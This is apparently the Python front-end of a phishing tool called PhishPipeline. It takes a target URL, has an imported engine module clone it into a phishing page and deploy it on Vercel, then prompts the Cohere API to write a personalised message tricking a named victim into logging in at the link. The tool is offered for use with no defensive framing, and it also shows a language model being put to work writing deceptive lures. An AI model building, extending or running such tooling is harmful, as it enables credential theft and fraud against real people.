import os
import time
import cohere
import requests
import threading
import webbrowser
import subprocess
import engine as eg
import PySimpleGUI as sg
from constants import GUI_THEME, REQ_HEADERS

sg.theme(GUI_THEME)
sg.set_options(background_color='#000000', text_color='#00ff00',
               button_color=('#00ff00', '#000000'))
phishing_url = ""


def open_window():
    # Define the layout of the UI for each stage
    stage1_layout = [
        [sg.Text('Stage 1: Generate Phishing Page', font=(
            'Consolas', 16), pad=((10, 10), (10, 20)))],
        [sg.Text('Enter the URL to be turned into a phishing page:',
                 font=('Consolas', 12))],
        [sg.Input(key='url', font=('Consolas', 12))],
        [sg.Button('Generate', font=('Consolas', 12), bind_return_key=True)],
        [sg.ProgressBar(1000, orientation='h', size=(
            20, 20), key='progress', bar_color=('green', 'grey'), visible=False)],
    ]

    stage2_layout = [
        [sg.Text('Stage 2: Deployment', font=(
            'Consolas', 16), pad=((10, 10), (10, 20)))],
        [sg.Text('The page will be deployed via Vercel.', font=('Consolas', 12))],
        [sg.Button('Confirm Deployment', font=('Consolas', 12),
                   bind_return_key=True, disabled=True)],
        [sg.ProgressBar(1000, orientation='h', size=(20, 20),
                        key='progress_deploy', bar_color=('green', 'grey'), visible=False)],
    ]

    stage3_layout = [
        [sg.Text('Stage 3: Generate Bait (Message to Victim)', font=(
            'Consolas', 16), pad=((10, 10), (10, 20)))],
        [sg.Text("Enter the victim's interests (comma separated):",
                 font=('Consolas', 12))],
        [sg.Input(key='interests', font=('Consolas', 12), disabled=True)],
        [sg.Button('Generate Bait', font=('Consolas', 12),
                   bind_return_key=True, disabled=True)]
    ]

    # Define the layout of the main UI
    layout = [
        [sg.Column(stage1_layout, key='stage1')],
        [sg.Column(stage2_layout, key='stage2', visible=False)],
        [sg.Column(stage3_layout, key='stage3', visible=False)],
        [sg.Output(size=(80, 6), font=('Consolas', 10),
                   key='output', pad=(20, 20))]
    ]

    window = sg.Window('PhishPipeline', layout)

    def generate_phishing_page(url):
        # Validate if the URL is up
        try:
            response = requests.get(url, headers=REQ_HEADERS)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            window['output'].Update('Error: ' + str(e))
            window.Refresh()
            return

        # Show the progress bar
        window['progress'].Update(visible=True)
        thread = threading.Thread(
            target=eg.generate_phishing_page, args=(url,))
        thread.start()

        progress = 0
        while thread.is_alive():
            progress = (progress + 5) % 1000
            window['progress'].UpdateBar(progress)
            window.Refresh()
            time.sleep(0.1)
        thread.join()
        # Hide the progress bar and show the next stage
        window['progress'].Update(visible=False)
        window['interests'].Update(disabled=False)
        window['stage2'].Update(visible=True)

    def deploy_phishing_page():
        # Show the progress bar
        window['progress_deploy'].Update(visible=True)
        global phishing_url
        result = []
        thread = threading.Thread(
            target=eg.deploy_phishing_page, args=(result,))
        thread.start()
        progress = 0
        while thread.is_alive():
            progress = (progress + 5) % 1000
            window['progress_deploy'].UpdateBar(progress)
            window.Refresh()
            time.sleep(0.1)  # Prevent high CPU usage
        thread.join()

        phishing_url = result[0]
        # Hide the progress bar and show the deployed link
        window['progress_deploy'].Update(visible=False)
        window['output'].Update(
            'The page has been deployed at {0}'.format(phishing_url))
        window['interests'].Update(disabled=True)
        window['stage3'].Update(visible=True)
        webbrowser.open(phishing_url)

    def generate_bait(interests):
        COHERE_API_KEY = os.getenv("COHERE_API_KEY")
        # Send a prompt with interests to the cohere api to get a bait message
        co = cohere.Client(COHERE_API_KEY)
        response = co.generate(
            model='command-xlarge-nightly',
            prompt="Write a message to trick a user named '<NAME>' to login to the link '{0}'. He is interested in {1}.".format(
                phishing_url, interests),
            max_tokens=300,
            temperature=0.9,
            k=0,
            stop_sequences=[],
            return_likelihoods='NONE')
        result = response.generations[0].text
        print('Bait:')
        print(result)
        subprocess.run("clip", text=True, input=result)
        sg.popup('Bait generation complete!',
                 'Bait (Copied to clipboard):', result, font=('Consolas', 14))

    # Start the event loop
    stage = 1
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED:
            break
        elif event == 'Generate':
            url = values['url']
            if url.strip() == '':
                window['output'].Update('Error: Please enter a valid URL.')
                window.Refresh()
            else:
                generate_phishing_page(url)
                stage = 2
        elif event == 'Confirm Deployment':
            deploy_phishing_page()
            stage = 3
        elif event == 'Generate Bait':
            interests = values['interests']
            if interests == '':
                print("\nError: Please enter the victim's interests.")
            else:
                generate_bait(interests)

        # Update the UI based on the current stage
        window[f'stage{stage}'].Update(visible=True)
        for i in range(stage+1, 4):
            window[f'stage{i}'].Update(visible=False)
        if stage == 1:
            pass
        elif stage == 2:
            window['Confirm Deployment'].Update(disabled=False)
            window['interests'].Update(disabled=False)
            window['Generate Bait'].Update(disabled=False)
        elif stage == 3:
            window['interests'].Update(disabled=False)
            window['Generate Bait'].Update(disabled=False)

    window.close()


if __name__ == '__main__':
    open_window()
